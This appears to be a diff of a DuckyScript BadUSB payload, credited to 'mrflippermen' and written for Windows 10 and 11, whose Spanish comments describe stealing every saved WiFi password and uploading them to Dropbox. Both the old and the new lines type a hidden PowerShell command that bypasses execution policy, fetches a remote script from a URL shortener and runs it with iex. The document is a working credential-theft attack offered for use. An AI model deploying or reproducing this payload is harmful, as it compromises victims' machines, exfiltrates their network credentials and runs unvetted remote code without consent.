@@ -1,11 +1,14 @@
+REM     Title: wifi-exfiltracion
 
-REM Author: Tu Nombre
-REM Date: 2024-07-15
-REM Description: Roba todas las contraseñas WiFi guardadas y las envía a un webhook de Dropbox.
+REM     Author:mrflippermen
 
-DELAY 1000
+REM     Description: Este script de PowerShell exporta las contraseñas de las redes WiFi almacenadas en tu computadora, las guarda en archivos de texto, las comprime en un archivo ZIP y luego sube el archivo ZIP a Dropbox. Después de completar el proceso, los archivos temporales se eliminan.
+
+REM     See README.md file for more details.
+
+REM     Target: Windows 10, 11
+
 GUI r
 DELAY 500
-STRING cmd /c "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$token=''; irm 'https://goo.su/3KEbG' | iex -Args $token""
+STRING powershell -w h -ep bypass $db='';irm https://goo.su/x3RyN | iex
 ENTER
-
